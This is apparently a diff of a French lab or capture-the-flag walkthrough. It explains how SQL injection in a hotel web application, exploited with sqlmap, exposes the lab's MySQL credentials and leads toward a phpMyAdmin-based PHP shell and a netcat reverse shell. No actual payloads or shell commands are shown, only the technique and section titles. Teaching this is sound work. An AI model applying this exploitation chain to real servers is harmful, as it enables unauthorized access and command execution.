+Il confirme donc les paramètres de connexion utilisés par l’application :
 
-```
+```text
 Serveur         : 127.0.0.1
 Utilisateur     : DBadmin
 Mot de passe    : imissyou
 Base de données : hotel
 ```
 
-La lecture du fichier est donc réussie. Elle révèle les identifiants MySQL utilisés par l’application : `DBadmin:imissyou`. 
+Le mot de passe `imissyou`, déjà retrouvé par `sqlmap` à partir du hash MySQL, est donc bien celui utilisé par l’application pour se connecter à la base de données.
 
- Le nom `DBadmin` concorde avec l’utilisateur identifié précédemment par `sqlmap`, tandis que les privilèges administratifs ont été établis séparément avec `--is-dba`. Cette séparation évite toute ambiguïté entre nom du compte, mot de passe et privilèges.
+La technique UNION se montre ici particulièrement efficace : le fichier de `75` octets est récupéré en quelques secondes, alors qu’une extraction en boolean-based blind aurait nécessité de nombreuses requêtes pour reconstruire son contenu caractère par caractère.
 
-Cette extraction présente toutefois un inconvénient important : elle a nécessité environ treize minutes pour récupérer un fichier de seulement `75` octets.
+Les deux méthodes utilisées permettent donc d’obtenir les mêmes identifiants MySQL :
 
-La raison est liée à la technique employée. Avec une injection **boolean-based blind**, `sqlmap` ne reçoit jamais directement la valeur recherchée. Il doit la déduire progressivement, caractère par caractère, au moyen de nombreuses requêtes HTTP.
+```text
+DBadmin:imissyou
+```
 
-Même si cette méthode est fiable, elle devient rapidement peu pratique lorsqu’il faut extraire davantage de données ou lire des fichiers plus volumineux.
+Tu pourrais maintenant utiliser `sqlmap` pour tenter d’obtenir directement un shell système avec l’option `--os-shell`.
 
-Il est donc judicieux de vérifier si le paramètre `cod` permet également une technique d’injection plus directe, notamment une injection **UNION query**.
+Cette méthode automatisée serait toutefois moins intéressante d’un point de vue pédagogique, car elle masquerait une partie importante du chemin d’exploitation.
 
-Lorsqu’elle est disponible, cette technique permet d’insérer les résultats d’une seconde requête SQL directement dans la réponse générée par l’application. L’extraction peut alors être réalisée en quelques requêtes, au lieu de reconstruire chaque caractère séparément.
+Tu choisis donc une approche plus traditionnelle : réutiliser les identifiants découverts pour te connecter à phpMyAdmin, puis exploiter les fonctionnalités disponibles dans l’interface afin de créer un petit shell PHP et d’obtenir ensuite un reverse shell.
 
-La technique booléenne a donc rempli son rôle : elle a confirmé la vulnérabilité et permis une première lecture de fichier. Sa lenteur justifie maintenant de rechercher une technique UNION, qui pourrait retourner les données directement dans la page et accélérer fortement la suite de l’exploitation.
-
-
-
-
+Cette démarche permettra de mieux comprendre comment un accès administratif à la base de données peut être transformé progressivement en exécution de commandes sur le serveur.
 
 
 
 
 
-
-
-
-
-### Exploitation de l’injection SQL pour obtenir une exécution de commandes
+### Exploitation de `PhpMyAdmin` pour obtenir une exécution de commandes
 
 #### Vérification des privilèges du compte MySQL
 
@@ -1014,7 +1293,7 @@ La technique booléenne a donc rempli son rôle : elle a confirmé la vulnérabi
 
 ### Obtention d’un reverse shell en tant que `www-data`
 
-#### Mise en écoute sur Kali avec rlwrap et netcat
+#### Mise en écoute sur Kali avec `rlwrap` et `netcat`
 
 #### Déclenchement du reverse shell
 
